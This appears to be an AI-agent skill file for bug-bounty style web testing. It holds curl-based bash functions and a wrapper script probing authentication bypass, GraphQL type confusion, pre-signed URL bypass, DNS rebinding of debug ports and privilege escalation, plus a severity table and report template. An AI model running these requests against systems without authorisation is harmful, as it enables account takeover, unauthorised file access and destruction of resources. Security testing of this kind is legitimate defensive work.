---
description: Find INSECURE vulnerabilities in web applications. Use when testing for INSECURE issues.
---

# INSECURE Vulnerability Testing Agent

## High-Value Patterns from Real Reports

### File Upload and Transformation Patterns
- **Endpoints**: `/file/upload/`, `/transformations/`, `/view_transformations`
- **Parameters**: `visibility`, `regenerate`, `profile`
- **Headers**: `Content-Type: multipart/form-data`

### Authentication Bypass Patterns
- **App Password Generation**: `/ocs/v2.php/core/getapppassword`
- **Password Confirmation Bypass**: `/ajax/register`, `/settings/auth`
- **Parameters**: `flow_name=signup`, `password_confirmation`

### GraphQL Access Control Issues
- **Endpoints**: `/graphql`, `/api/v2/graphql`, `/admin/api/*/graphql`
- **Common Mutations**: `destroySnippet`, `onlineStoreThemePublish`, `appCreditCreate`
- **ID Parameters**: `gid://gitlab/*`, `gid://shopify/*`

### XPC/IPC Service Vulnerabilities
- **Debugging Endpoints**: `--inspect`, `/json`, `/metrics`
- **Headers**: `Host: localhost`, `Host: localhost6`

### Pre-signed URL Bypass
- **Parameters**: `OC-Credential`, `OC-Verb=GET`, `OC-Expires`, `OC-Date`, `OC-Signature`
- **Pattern**: `/remote.php/dav/files/{username}/{filename}`

### Session Management Issues
- **Endpoints**: `/sessions`, `/2fa/enable`, `/profile`
- **Headers**: `X-Auth-Token`, `X-CSRF-Token`

## Testing Methodology

### 1. File Upload Access Control Testing

```bash
# Test file transformation bypass
test_file_transformation() {
    local target="$1"
    
    # Upload private file
    echo "Testing file transformation bypass on $target"
    
    # Check for transformation endpoints
    curl -s "$target/file/upload/" | grep -i "transformation\|regenerate"
    curl -s "$target/view_transformations" -H "Cookie: $COOKIE"
    
    # Test regeneration without proper access control
    curl -X POST "$target/transformations/regenerate" \
         -H "Cookie: $COOKIE" \
         -d "profile=true&visibility=private"
}

# Test secure view bypass
test_secure_view_bypass() {
    local share_url="$1"
    
    echo "Testing secure view bypass"
    
    # Try adding /download to bypass
    curl -I "${share_url}/download" 2>/dev/null | head -1
    
    # Check if download is blocked
    if curl -s "$share_url" | grep -q "Hide Download\|Secure View"; then
        echo "POTENTIAL: Secure view bypass via ${share_url}/download"
    fi
}
```

### 2. Authentication Bypass Testing

```bash
# Test app password generation bypass
test_app_password_bypass() {
    local target="$1"
    
    echo "Testing app password bypass on $target"
    
    # Check for OCS endpoints
    curl -s "$target/ocs/v2.php/core/getapppassword" \
         -H "Cookie: $COOKIE" \
         -H "X-Requested-With: XMLHttpRequest"
    
    # Test password confirmation bypass
    curl -X POST "$target/ajax/register" \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -d "flow_name=signup&skip_password_confirm=true"
}

# Test 2FA session invalidation
test_2fa_session_bypass() {
    local target="$1"
    local session1="$2"
    local session2="$3"
    
    echo "Testing 2FA session invalidation bypass"
    
    # Enable 2FA with session1
    curl -X POST "$target/profile/2fa/enable" \
         -H "Cookie: $session1" \
         -d "enabled=true"
    
    # Check if session2 is still valid
    curl -s "$target/profile" -H "Cookie: $session2" | grep -q "2FA" && {
        echo "VULNERABLE: Session not invalidated after 2FA enable"
    }
}
```

### 3. GraphQL Access Control Testing

```bash
# Test GraphQL type confusion
test_graphql_type_confusion() {
    local target="$1"
    
    echo "Testing GraphQL type confusion on $target"
    
    # Test snippet destruction with wrong object type
    curl -X POST "$target/graphql" \
         -H "Content-Type: application/json" \
         -H "Cookie: $COOKIE" \
         -d '{
            "query": "mutation { 
                destroySnippet(input: {id: \"gid://gitlab/DiffNote/116\"}) { 
                    errors 
                } 
            }"
        }'
    
    # Test theme publication bypass
    curl -X POST "$target/admin/api/*/graphql" \
         -H "Content-Type: application/json" \
         -H "Cookie: $COOKIE" \
         -d '{
            "operationName": "ThemePublishLegacy",
            "variables": {"id": "gid://shopify/OnlineStoreTheme/PAID_THEME_ID"},
            "query": "mutation ThemePublishLegacy($id: ID!) { onlineStoreThemePublish(id: $id) { theme { id } userErrors { field message } } }"
        }'
}

# Test disabled account GraphQL bypass
test_disabled_account_graphql() {
    local target="$1"
    
    echo "Testing disabled account GraphQL access"
    
    # Try accessing GraphQL while account disabled
    curl -X POST "$target/graphql" \
         -H "Content-Type: application/json" \
         -H "Cookie: $DISABLED_ACCOUNT_COOKIE" \
         -d '{
            "query": "query { me { id sessions { edges { node { ip_address user_agent } } } } }"
        }' | grep -q "sessions" && {
            echo "VULNERABLE: Disabled account can access GraphQL"
        }
}
```

### 4. Pre-signed URL Testing

```bash
# Test pre-signed URL bypass
test_presigned_url_bypass() {
    local target="$1"
    local username="$2"
    local filename="$3"
    
    echo "Testing pre-signed URL bypass"
    
    # Test with invalid signature and expired date
    curl -s "$target/remote.php/dav/files/$username/$filename?OC-Credential=$username&OC-Verb=GET&OC-Expires=60&OC-Date=2020-01-01T00:00:00.000Z&OC-Signature=invalid" \
         -H "User-Agent: Mozilla/5.0" | head -10
    
    # Check for successful access without valid signature
    if [ $? -eq 0 ]; then
        echo "VULNERABLE: Pre-signed URL bypass - expired signature not validated"
    fi
}
```

### 5. DNS Rebinding Testing

```bash
# Test DNS rebinding on debug interfaces
test_dns_rebinding() {
    local target="$1"
    local port="$2"
    
    echo "Testing DNS rebinding on debug interface"
    
    # Test localhost6 bypass
    curl -s "http://localhost6:$port/json" \
         -H "Host: localhost6" 2>/dev/null && {
            echo "VULNERABLE: DNS rebinding via localhost6"
        }
    
    # Test inspect endpoint
    curl -s "$target:$port/json" \
         -H "Host: localhost6" 2>/dev/null | grep -q "devtools" && {
            echo "VULNERABLE: Debug interface accessible via DNS rebinding"
        }
}
```

### 6. Permission Escalation Testing

```bash
# Test staff permission bypass
test_staff_permission_bypass() {
    local target="$1"
    
    echo "Testing staff permission bypass"
    
    # Test app creation without proper permissions
    curl -X POST "$target/admin/internal/web/graphql/core" \
         -H "Content-Type: application/json" \
         -H "Cookie: $LIMITED_STAFF_COOKIE" \
         -d '{
            "operationName": "CreateAppMutation",
            "variables": {"input": {"title": "test_app"}},
            "query": "mutation CreateAppMutation($input: AppInput!) { appCreate(input: $input) { app { id title } userErrors { field message } } }"
        }' | grep -q "app.*created" && {
            echo "VULNERABLE: Staff can create apps without proper permissions"
        }
}

# Test invite bypass
test_invite_bypass() {
    local target="$1"
    
    echo "Testing invite bypass"
    
    # Test email domain bypass
    curl -X POST "$target/invite" \
         -H "Content-Type: application/json" \
         -d '{"email": "attacker@company.com"}' | grep -q "invited" && {
            echo "VULNERABLE: Email domain restriction bypass"
        }
}
```

## Comprehensive Testing Script

```bash
#!/bin/bash

test_insecure_vulnerabilities() {
    local target="$1"
    local cookie="$2"
    
    echo "=== INSECURE Vulnerability Testing for $target ==="
    
    # Set global variables
    export COOKIE="$cookie"
    export TARGET="$target"
    
    # Test categories
    echo "[+] Testing File Upload Access Control"
    test_file_transformation "$target"
    test_secure_view_bypass "$target/share/xyz"
    
    echo "[+] Testing Authentication Bypass"
    test_app_password_bypass "$target"
    test_2fa_session_bypass "$target" "$cookie" "$cookie"
    
    echo "[+] Testing GraphQL Access Control"
    test_graphql_type_confusion "$target"
    test_disabled_account_graphql "$target"
    
    echo "[+] Testing Pre-signed URL"
    test_presigned_url_bypass "$target" "admin" "secret.txt"
    
    echo "[+] Testing DNS Rebinding"
    test_dns_rebinding "$target" "9229"
    
    echo "[+] Testing Permission Escalation"
    test_staff_permission_bypass "$target"
    test_invite_bypass "$target"
    
    echo "[+] Testing Session Management"
    curl -s "$target/profile" -H "Cookie: $cookie" | grep -i "session\|token"
    
    echo "=== Testing Complete ==="
}

# Usage
# test_insecure_vulnerabilities "https://target.com" "session_cookie_here"
```

## Severity Rating Table

| Vulnerability Type | Severity | Impact |
|-------------------|----------|---------|
| File Transformation Public Exposure | High | Private files become publicly accessible |
| Authentication Bypass (Password Confirm) | High | Account takeover without credentials |
| GraphQL Type Confusion | Critical | Repository/resource destruction |
| DNS Rebinding Debug Access | High | Remote code execution via debug interface |
| Pre-signed URL Bypass | High | Unauthorized file access |
| Staff Permission Escalation | Medium | Privilege escalation in organization |
| 2FA Session Not Invalidated | Medium | Concurrent session access bypass |
| Disabled Account GraphQL Access | Medium | Data access after account disable |
| Email Verification Bypass | Medium | Account creation with unverified email |
| Invite System Bypass | Low | Unauthorized workspace access |

## False Positives to Ignore

1. **Expected Public Endpoints**: `/health`, `/status`, `/version` endpoints are often intentionally public
2. **Rate Limiting Responses**: 429 responses don't indicate access control issues
3. **CORS Preflight**: OPTIONS requests with CORS headers are normal
4. **Cache Headers**: Presence of cache control headers doesn't indicate vulnerability
5. **Generic Error Messages**: Generic 404/403 without data leakage
6. **Logout Redirects**: Redirects after logout are expected behavior

## Finding Report Template

```markdown
# INSECURE: [Vulnerability Type] in [Component]

## Summary
Brief description of the access control vulnerability and its impact.

## Vulnerability Details
- **Type**: [Authentication Bypass/Authorization Flaw/Session Management/etc.]
- **Component**: [GraphQL API/File Upload/XPC Service/etc.]
- **Affected Endpoints**: 
  - `POST /endpoint1`
  - `GET /endpoint2`

## Steps to Reproduce

1. **Setup**: [Required conditions]
   ```bash
   # Setup commands
   ```

2. **Exploit**: [Step-by-step exploitation]
   ```bash
   curl -X POST "https://target.com/vulnerable/endpoint" \
        -H "Content-Type: application/json" \
        -H "Cookie: session_cookie" \
        -d '{"malicious": "payload"}'
   ```

3. **Verification**: [How to confirm the issue]

## Impact
- **Confidentiality**: [Data that can be accessed]
- **Integrity**: [What can be modified]
- **Availability**: [Services that can be disrupted]
- **Business Impact**: [Financial/operational consequences]

## Evidence
```
[HTTP Request/Response or command output]
```

## Remediation
1. Implement proper authorization checks
2. Validate user permissions before processing requests
3. Invalidate sessions after security state changes
4. Use principle of least privilege

## Risk Rating: [Critical/High/Medium/Low]
```